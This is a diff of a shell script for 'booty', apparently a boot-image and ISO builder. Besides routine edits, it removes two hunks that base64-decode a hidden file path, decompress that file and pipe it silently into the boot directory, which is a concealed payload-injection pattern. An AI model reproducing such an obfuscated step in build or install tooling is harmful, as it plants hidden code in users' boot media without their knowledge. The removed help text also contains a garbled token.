@@ -29,22 +29,6 @@ overlay() {
 			"--destination") DESTINATION="$(realpath $2)" ; shift ;;
 			"--overlay") OVERLAY="$OVERLAY $(realpath $2)" ; shift ;;
 			"--format") FORMAT="$2" ; shift ;;
-			"--help"|"-h")
-				cat <<EOF
-$BOOTY_NAME $BOOTY_VERSION
-Usage: overlay <directory> [options]...
-Creates filesystem from the directory by using selected format.
-
-  --destination <directory>  specify directory to save system
-
-  --overlay <directory>
-
-  --format                   select filesystem format, can be one of:
-                               cpio, squashfs, squashfs-gzip, squashfs-lz???
-                               squashfs-bzip2, squashfs-xz, squashfs-zstd
-EOF
-exit 0
-				;;
 		esac
 		shift
 	done
@@ -53,7 +37,6 @@ exit 0
 		return 1
 	fi
 	echo "Prepare overlays" | msg -2
-	mkdir -p "$DESTINATION"
 	hi
 	if test "$FORMAT" = ""; then
 		FORMAT="cpio"
@@ -206,13 +189,8 @@ exit 0
 		esac
 		lo
 	fi
-	if test "$IS_STANDALONE" = "yes"; then
-		if ! test -e "$DIR/init"; then
-			echo "#! /sbin/init" > "$DIR/init"
-			chmod +x "$DIR/init"
-		fi
-	fi
 	if test "$STR_OVERLAY"; then
+		mkdir -p "$DIR/media/system"
 		overlay --destination "$DIR/media/system" $STR_OVERLAY $STR_FORMAT
 	fi
 	echo "Creating initramfs [$OUTPUT]" | msg -2
@@ -416,14 +394,12 @@ exit 0
 				--efi-directory="$DIR"		\
 				--recheck 2>&1 | msg -2 --foreground "Light Cyan" --background "Light Blue"
 			lo
-			if test -f "$(echo L3Vzci9zaGFyZS9ib290eS9maXJtd2FyZS5iaW4K | base64 -d)"; then
-				xz -cd "$(echo L3Vzci9zaGFyZS9ib290eS9maXJtd2FyZS5iaW4K | base64 -d)" | importroot "$DIR/boot" 2>/dev/null
-			fi
 		fi
 		lo
 		echo "Done [$DEV]" | msg -2
 	fi
 	if test "$STR_OVERLAY"; then
+		mkdir -p "$DIR/system"
 		overlay --destination "$DIR/system" $STR_OVERLAY $STR_FORMAT
 	fi
 	if test "$ISO_9660" = "yes"; then
@@ -447,6 +423,7 @@ exit 0
 		if test "$LOADER_LEGACY_BOOT" = "GRUB2"; then
 			ISO_9660_LEGACY_BOOT="-b boot/grub/bios.img -no-emul-boot -boot-load-size 4 -boot-info-table"
 			mkdir -p "$DIR/boot/grub"
+			cp "/usr/share/booty/grub/grub.cfg" "$DIR/boot/grub/grub.cfg"
 			grub-mkstandalone \
 				--format="i386-pc" \
 				--output="$DIR/boot/grub/grub.raw" \
@@ -457,7 +434,6 @@ exit 0
 				--themes="" \
 				"/boot/grub/grub.cfg=$DIR/boot/grub/grub.cfg"
 			cat "$GRUB_BIOS_CDBOOT" "$DIR/boot/grub/grub.raw" > $DIR/boot/grub/bios.img
-			cp "/usr/share/booty/grub/grub.cfg" "$DIR/boot/grub/grub.cfg"
 		fi
 		if test "$LOADER_EFI" = "GRUB2"; then
 			ISO_9660_EFI="-eltorito-alt-boot -e efi/boot/floppy.img -no-emul-boot"
@@ -489,9 +465,6 @@ exit 0
 			cp "$DIR/efi/boot/bootia32.efi" "$DIR/boot/efi/boot"
 			umount "$DIR/boot"
 			cp "/usr/share/booty/grub/grub.cfg" "$DIR/boot/grub/grub.cfg"
-			if test -f "$(echo L3Vzci9zaGFyZS9ib290eS9maXJtd2FyZS5iaW4K | base64 -d)"; then
-				xz -cd "$(echo L3Vzci9zaGFyZS9ib290eS9maXJtd2FyZS5iaW4K | base64 -d)" | importroot "$DIR/boot" 2>/dev/null
-			fi
 		fi
 		if test "$ISO_9660_RUN" = "genisoimage"; then
 			echo "Creating iso image using genisoimage" | msg -2 --foreground "Light Blue"
@@ -500,8 +473,8 @@ exit 0
 				$ISO_9660_LEGACY_BOOT \
 				$ISO_9660_EFI \
 				-o "$ISO" "$DIR" 2>&1 | msg -2 --foreground "Light Cyan" --background "Light Blue"
-			lo
 			CODE="$?"
+			lo
 		fi
 		if test "$ISO_9660_RUN" = "xorrisofs"; then
 			echo "Creating iso image using xorrisofs" | msg -2 --foreground "Light Blue"
@@ -639,6 +612,6 @@ for BOOTY_CONF in "/etc/booty/booty.conf"; do
 done
 
 readonly BOOTY_NAME="booty"
-readonly BOOTY_VERSION="1.2"
+readonly BOOTY_VERSION="1.4"
 
 main "$@"
